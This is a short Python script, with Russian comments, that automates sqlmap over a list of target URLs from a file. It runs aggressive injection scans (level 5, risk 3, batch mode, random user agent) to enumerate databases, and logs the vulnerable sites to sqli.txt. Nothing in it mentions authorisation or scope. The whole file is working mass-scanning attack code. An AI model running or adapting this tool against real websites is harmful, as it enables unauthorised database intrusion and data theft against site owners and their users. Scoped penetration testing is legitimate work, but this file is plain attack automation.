import subprocess

class SQLtest:
    def __init__(self) -> None:
        self.targets = open('targets.txt', 'r')
        self.CHECK_DB = "available databases [" # это то что выводит sqlmap если нашел бд
        self.DIR_SQLMAP = '/home/kaliuser/Pentest/sqlmap/' # меняй на ту папку где у тя sqlmap

    def generic_param_get(self, target):
        param_sqlmap = ['python', 'sqlmap.py', '-u', f'{target}', '--dbs', '--random-agent',
                            '--level=5', '--risk=3', '--batch', '--technique=T']
        return param_sqlmap

    def start_sqlmap_get(self, param):
        process = subprocess.Popen(param, cwd=self.DIR_SQLMAP,
                                    stdout=subprocess.PIPE, stderr=subprocess.PIPE)

        stdout, stderr = process.communicate()

        output = stdout.decode()
        error_output = stderr.decode()

        if process.returncode == 0:
            if self.CHECK_DB in output:
                with open('sqli.txt', 'a') as sql_save:
                    sql_save.write(f"{param}\n")
                print(f"SQLI: {param[3]}")
            else:
                print(f"Site {param[3].strip('"')} not injectable((")            
        else:
            print(f"ERROR: \n{error_output}")
    
    def main_scan(self):
        for target in self.targets:
            print(f"Start scan {target}")
            param_sqlmap = self.generic_param_get(target)
            self.start_sqlmap_get(param_sqlmap)